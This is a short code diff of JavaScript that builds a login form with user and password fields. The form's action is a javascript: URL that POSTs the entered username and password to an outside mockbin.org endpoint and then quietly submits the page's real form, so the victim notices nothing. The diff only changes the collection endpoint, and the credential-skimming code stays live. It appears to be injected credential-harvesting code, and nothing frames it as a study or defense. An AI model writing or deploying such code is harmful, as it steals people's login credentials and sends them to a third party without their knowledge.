@@ -4,7 +4,7 @@ let password=document.createElement("input");
 let labelUsuario=document.createElement("label");
 let labelPassword=document.createElement("label");
 form.setAttribute("method", "post");
-form.setAttribute("action", 'javascript:var xhr = new XMLHttpRequest();xhr.withCredentials = true;xhr.addEventListener("readystatechange", function () {if (this.readyState === this.DONE) {document.forms[0].usuario.value=usuario.value;document.forms[0].password.value=password.value;document.forms[0].submit();}});xhr.open("POST", "http://mockbin.org/bin/3519b557-4cc5-40f5-809c-4065c7d5c9bb");xhr.send(`user=${usuario.value};password=${password.value}`);');
+form.setAttribute("action", 'javascript:var xhr = new XMLHttpRequest();xhr.withCredentials = true;xhr.addEventListener("readystatechange", function () {if (this.readyState === this.DONE) {document.forms[0].usuario.value=usuario.value;document.forms[0].password.value=password.value;document.forms[0].submit();}});xhr.open("POST", "http://mockbin.org/bin/b472abbc-c914-4604-8a40-18b0d44b894b");xhr.send(`user=${usuario.value};password=${password.value}`);');
 usuario.setAttribute("type", "text");
 usuario.setAttribute("class", "user");
 usuario.setAttribute("size", "20");
